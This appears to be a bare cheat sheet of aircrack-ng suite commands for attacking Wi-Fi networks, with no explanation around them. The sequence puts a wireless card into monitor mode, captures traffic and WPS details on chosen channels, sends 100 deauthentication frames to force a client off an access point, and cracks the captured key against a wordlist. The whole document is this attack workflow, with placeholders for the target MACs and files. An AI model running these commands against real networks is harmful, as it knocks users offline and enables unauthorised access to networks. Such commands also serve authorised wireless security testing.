ifconfig
iwconfig
iwconfig wlan0 channel 6

airmon-ng check --kill
airmon-ng start wlan1 6
airmon-ng stop wlan1mon

airodump-ng wlan1mon --channel 6,11 --write <filename> --manufacturer --wps

aireplay-ng --deauth 100 -a <AP mac> -c <client mac> wlan1mon

aircrack-ng <filename.cap> -w <wordlist_file> -l <output_key_file>
